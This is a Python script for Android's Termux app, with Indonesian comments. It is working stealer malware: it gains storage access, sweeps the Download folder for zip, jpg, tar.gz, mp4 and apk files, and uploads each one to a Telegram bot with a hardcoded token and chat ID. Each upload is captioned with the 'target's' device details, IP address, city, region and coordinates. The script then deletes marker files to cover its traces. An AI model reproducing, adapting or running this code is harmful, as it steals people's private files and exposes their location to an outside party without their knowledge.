import os
import time
import requests
import subprocess
from pathlib import Path
import psutil

TOKEN = "7925212843:AAEAUNjooVQ8fESLepWlqP2cNgpDF_T0zlk"
CHAT_ID = ["7732851201"]
cek_path = Path("/data/data/com.termux/files/usr/lib/commplate")
sent_files_file = "/data/data/com.termux/files/usr/lib/sent_files.txt"
sent_files = set()

# Cek jika sent_files.txt sudah ada
if Path(sent_files_file).exists():
    with open(sent_files_file, "r") as f:
        sent_files = set(f.read().splitlines())

def get_device_info():
    try:
        # Menjalankan neofetch untuk mendapatkan informasi perangkat
        result = subprocess.check_output(["neofetch", "--stdout"]).decode("utf-8")
        brand = next(line.split(":")[1].strip() for line in result.splitlines() if "Host:" in line)
        os_name = next(line.split(":")[1].strip() for line in result.splitlines() if "OS:" in line)

        # Mendapatkan informasi memori
        memory = psutil.virtual_memory().total / (1024 ** 3)  # Konversi ke GB
        memory_info = f"{memory:.2f} GB"
        
        # Mendapatkan informasi IP dan lokasi
        ip_info = requests.get("http://ipinfo.io").json()
        ip_address = ip_info.get("ip", "N/A")
        city = ip_info.get("city", "N/A")
        region = ip_info.get("region", "N/A")
        country = ip_info.get("country", "N/A")
        loc = ip_info.get("loc", "N/A")

        return brand, os_name, memory_info, ip_address, city, region, country, loc

    except Exception as e:
        return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"

def send_file(file_path, caption):
    with open(file_path, "rb") as f:
        for chat_id in CHAT_ID:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                data={"chat_id": chat_id, "caption": caption},
                files={"document": f}
            )
        sent_files.add(file_path)
        with open(sent_files_file, "a") as sf:
            sf.write(f"{file_path}\n")

def process_files(extension):
    for root, _, files in os.walk("/storage/emulated/0/Download"):
        for file in files:
            if file.endswith(f".{extension}") and file not in sent_files:
                file_path = os.path.join(root, file)
                brand, os_name, memory, ip_address, city, region, country, loc = get_device_info()
                caption = (
                    f" CY78 PROJECTS \n\n"
                    f"🔰 Informasi Target 🔰\n"
                    f"📝 Nama Target : {file}\n"
                    f"📱 Merek : {brand}\n"
                    f"🖥️ OS : {os_name}\n"
                    f"💾 Memori : {memory}\n"
                    f"📂 Asal Direktori : {root}\n"
                    f"🌐 Alamat IP : {ip_address}\n"
                    f"🏙️ Kota : {city}\n"
                    f"📍 Wilayah : {region}\n"
                    f"🇨🇺 Negara : {country}\n"
                    f"📌 Lokasi : {loc}"
                )
                send_file(file_path, caption)

def main():
    while True:
        if cek_path.exists():
            if not Path("/data/data/com.termux/files/usr/bin/neofetch").exists():
                os.system("pkg install neofetch -y")
            if not Path("/data/data/com.termux/files/usr/bin/curl").exists():
                os.system("pkg install curl -y")
            if not Path("/data/data/com.termux/files/usr/bin/jq").exists():
                os.system("pkg install jq -y")

            # Proses file dengan ekstensi yang ditentukan
            extensions = ["zip", "jpg", "tar.gz", "mp4", "apk",]
            for ext in extensions:
                process_files(ext)
                time.sleep(1)

            # Membersihkan file sementara dan keluar
            if Path("/data/data/com.termux/files/usr/lib/bash/whoamie").exists():
                os.remove("/data/data/com.termux/files/usr/lib/bash/whoamie")
            if Path("/data/data/com.termux/files/usr/lib/bash/mewing").exists():
                os.remove("/data/data/com.termux/files/usr/lib/bash/mewing")
            break

        else:
            os.system("clear")
            os.system("echo y | termux-setup-storage")
            os.system("apt-get update")
            os.system("apt-get install -y curl neofetch jq")
            cek_path.touch()
            time.sleep(55)

if __name__ == "__main__":
    main()
